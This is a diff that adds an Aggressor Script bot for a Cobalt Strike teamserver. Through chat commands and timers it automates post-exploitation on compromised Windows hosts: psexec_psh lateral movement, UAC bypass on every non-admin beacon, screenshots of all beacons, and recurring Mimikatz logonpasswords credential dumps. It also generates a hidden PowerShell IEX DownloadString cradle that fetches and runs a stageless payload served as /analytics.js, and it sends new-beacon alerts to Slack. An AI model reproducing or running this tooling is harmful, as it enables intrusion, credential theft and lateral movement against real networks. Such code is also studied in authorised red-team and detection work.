@@ -1,0 +1,321 @@
+# This is a bot for Cobalt Strike!
+# Features:
+# - Welcome users to your teamserver
+# - Play ping pong
+# - List beacons by ID
+# - List listeners
+# - PsExec from the event log
+# - Automatically bypass UAC
+# - Screenshot all beacons
+# - Post new beacon notifications to Slack
+# - Run logonpasswords on specified beacons every 30 minutes
+
+global('$notify @autodump');
+
+$notify = 0;
+@autodump = @();
+
+# PsExec against $target from $bid
+# TODO figure out how to use with make_token
+sub psexecTarget {
+    local('$bid $target $listener');
+    ($bid, $target, $listener) = @_; # @_ contains the arguments for the subroutine.
+    say("Owning $target with psexec_psh.");
+    bpsexec_psh($bid, $target, $listener);
+}
+
+# Attempt to bypass UAC on all non-admin shells
+sub elevateAll {
+    local('$listener');
+    $listener = $1;
+
+    # Iterate over all beacons with beacons()
+    foreach $b (beacons()) {
+        # Get the id field from $b
+        $bid = $b['id'];
+
+        if (!-isadmin $bid) {
+            say("Attempting to elevate beacon $bid");
+            bbypassuac($bid, $listener);
+        }
+        sleep(1000);
+    }
+}
+
+# Get PowerShell DownloadString payload
+sub getDownloadString {
+    foreach $s (sites()) {
+        # Check if the site has powershell in the description
+        if ($s['Description'] hasmatch "powershell") {
+            # Build URL and DownloadString
+            $url = "https://" . $s['Host'] . $s['URI'];
+            $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('";
+            $downloadString .= $url . "'))\"";
+
+            # println("Returning DownloadString: $downloadString");
+            say("Found Powershell DownloadString payload: \c9$downloadString\o");
+            return true;
+        }
+        else {
+            say("No DownloadString cradle found. Try !downloadstring <LISTENER> first.");
+        }
+    }
+    return false;
+}
+
+# Create PowerShell DownloadString payload
+sub createDownloadString {
+    local ('$listener $script $host $url');
+
+    if (-istrue getDownloadString()){
+        # println("DownloadString already exists!");
+        return;
+    }
+    else {
+        $listener = $1;
+
+        $host = listener_info($listener)['host'];
+
+        artifact_stageless($listener, "powershell", "x86", $null, $this);
+        yield;
+
+        $script = $1;
+
+        $url = site_host($host, "443", "/analytics.js", $script, "text/plain", "Scripted Web Delivery(powershell)");
+        $url = strrep($url, "http", "https");
+
+        $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('";
+        $downloadString .= $url . "'))\"";
+
+        # println("Returning DownloadString $downloadString");
+        say("Here's your DownloadString: \c9$downloadString\o");
+    }
+}
+
+# Get Windows version and set the Beacon note
+sub getVersion {
+    local ('$bid $version $winver');
+
+    $bid = $1;
+    $version = binfo($bid, 'ver');
+
+    if ($version eq "6.1") {
+        $winver = "Win7 or 2008";
+    }
+    else if ($version eq "6.2") {
+        $winver = "Win8 or 2012";
+    }
+    else if ($version eq "6.3") {
+        $winver = "Win8.1 or 2012 R2";
+    }
+    else if ($version eq "10.0") {
+        $winver = "Win10 or 2016";
+    }
+    else {
+        $winver = "Unknown version";
+    }
+
+    bnote($bid, "OS: $winver");
+}
+
+# Send Slack notification on a new Beacon
+sub notifyBeacon {
+    local ('$bid $bUser $bIntIP $bName $msg @cmd $url');
+
+    $bid = $1;
+    $bUser = binfo($bid, 'user');
+    $bIntIP = binfo($bid, 'host');
+    $bName = binfo($bid, 'computer');
+
+    # Text file with Slack webhook URL
+    $url = readln(openf("url.txt"));
+
+    $msg = $bUser . "@" . $bIntIP . " (". $bName . ")";
+
+    # Codename to tag message with
+    $codename = "CODENAME";
+
+    # Build our curl command
+    @cmd = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Bot", "icon_emoji": ":ghost:", "channel": "CHANNEL", "attachments" : [{ "pretext":"<!everyone> ' . $codename . ' - NEW BEACON:" , "text" : "' . $msg . '"}]}',$url);
+
+    # Run our curl command and get the output
+    println(readAll(exec(@cmd)));
+}
+
+# Add or remove beacon to autodump
+sub autodump {
+    $bid = $1;
+    add(@autodump, $bid, -1);
+}
+
+# Triggered on all public events in the event log
+on event_public {
+    local('@input $cmd @args')
+    if (substr($2, 0, 1) eq "!") { # If first character is !, it's a command
+        @input = split(" ", $2); # Split incoming command on spaces
+        $cmd = @input[0]; # Command is !<cmd> arg1 arg2...
+        @args = sublist(@input, 1); # sublist gets everything after !cmd
+
+        # Log to script console for debug purposes
+        # println("Command received: $cmd");
+        # println("Arguments: " . @args);
+        # Play ping pong
+        if ($cmd eq "!ping") {
+            say("pong!");
+        }
+        # List all beacons by ID
+        else if ($cmd eq "!beacons") {
+            say ("Number of Beacons: " . size(beacons()));
+            foreach $b (beacons()) {
+                say("Beacon: $b['id'] on $b['computer'] as $b['user']");
+            }
+        }
+        # List all listeners
+        else if ($cmd eq "!listeners") {
+            foreach $l (listeners()) {
+                say("Listener: $l");
+            }
+        }
+        # psexec to target host from beacon
+        else if ($cmd eq "!psexec") {
+            if (size(@args) == 3) {
+                $bid      = @args[0];
+                $target   = @args[1];
+                $listener = @args[2];
+
+                # Log to script console for debug purposes
+                # println("Beacon ID: $bid");
+                # println("Target: $target");
+                # println("Listener: $listener");
+
+                psexecTarget($bid, $target, $listener);
+            }
+        }
+        # Elevate all non-admin beacons
+        else if ($cmd eq "!elevate") {
+            $listener = @args[0];
+
+            elevateAll($listener);
+        }
+        # Screenshot all beacons
+        else if ($cmd eq "!screenshot") {
+            foreach $b (beacons()){
+                bscreenshot($b['id']);
+                sleep(1000);
+            }
+        }
+        # Get DownloadString to stage Beacon
+        else if ($cmd eq "!downloadstring") {
+            if (!@args) {
+                getDownloadString();
+            }
+            else {
+                $listener = @args[0];
+
+                createDownloadString($listener);
+            }
+        }
+        # Run logonpasswords on all Beacons
+        else if ($cmd eq "!mimikatz") {
+            foreach $b (beacons()) {
+                blogonpasswords($b['id']);
+                sleep(1000);
+            }
+        }
+        else if ($cmd eq "!notify") {
+            if (!@args) {
+                if ($notify == 1) {
+                    elog("Notifications: \c9ON\o");
+                }
+                else {
+                    elog("Notifications: \c4OFF\o");
+                }
+            }
+            else {
+                if (@args[0] eq "on") {
+                    $notify = 1;
+                    elog("Notifications turned \c9ON\o");
+                }
+                else if (@args[0] eq "off") {
+                    $notify = 0;
+                    elog("Notifications turned \c4OFF\o");
+                }
+                else {
+                    say("Please choose \c9on\o or \c4off\o");
+                }
+            }
+        }
+        else if ($cmd eq "!r") {
+            local ('$msg');
+            if (!@args) {
+                say("Enter a note!");
+            }
+            else {
+                foreach $s (@args){
+                    $msg = $msg . " " . $s;
+                }
+                elog("Operator note: $msg");
+            }
+        }
+        # Get help.
+        else if ($cmd eq "!help") {
+            say("Beep boop! Here are my commands:");
+            say("ping:\t\t\tPong!");
+            say("beacons:\t\t\tList all beacons.");
+            say("listeners:\t\t\tList all listeners.");
+            say("psexec <bid> <target> <listener>:\tSpawn a shell on <target> from <bid>.");
+            say("elevate:\t\t\tAttempt to bypass UAC on all non-admin beacons.");
+            say("screenshot:\t\t\tAttempt to screenshot all beacons.");
+            say("downloadstring:\t\t\tGet a Powershell DownloadString payload.");
+            say("mimikatz:\t\t\tTask all beacons to run logonpasswords.");
+            say("notify:\t\t\tSend notifications to Flowdock for all new Beacons.");
+        }
+        else if ($cmd eq "!autodump") {
+            if (!@args) {
+                say("Enter a beacon ID!");
+            }
+            else {
+                foreach $bid (@args) {
+                    autodump($bid);
+                }
+            }
+        }
+    }
+}
+
+on beacon_initial {
+    local('$b');
+    global('$notify');
+    # If incoming beacon is admin, call it out in event log
+    if (-isadmin $1) {
+        # $1 for beacon_initial event is beacon ID, have to get metadata with bdata($1)
+        $b = bdata($1);
+        say("\c5New admin beacon: \c2" . $b['user'] . "@" . $b['computer'] . "\c5!\o");
+    }
+
+    # Get Windows version and set Beacon note
+    getVersion($1);
+
+    # If notifications are turned on, notify when we get a new beacon
+    if ($notify == 1) {
+        notifyBeacon($1);
+    }
+}
+
+# Log all beacon tasks to event log for situational awareness
+on beacon_tasked {
+    local('$bid $hostname $user');
+
+    $bid = $1;
+    $hostname = binfo($bid, 'computer');
+    $user = binfo($bid, 'user');
+
+    elog($user . "@" . $hostname . " tasked: $2");
+}
+
+# Dump Mimikatz on all beacons in @autodump every 30 minutes
+on heartbeat_30m {
+    foreach $bid (@autodump) {
+        blogonpasswords($bid);
+    }
+}
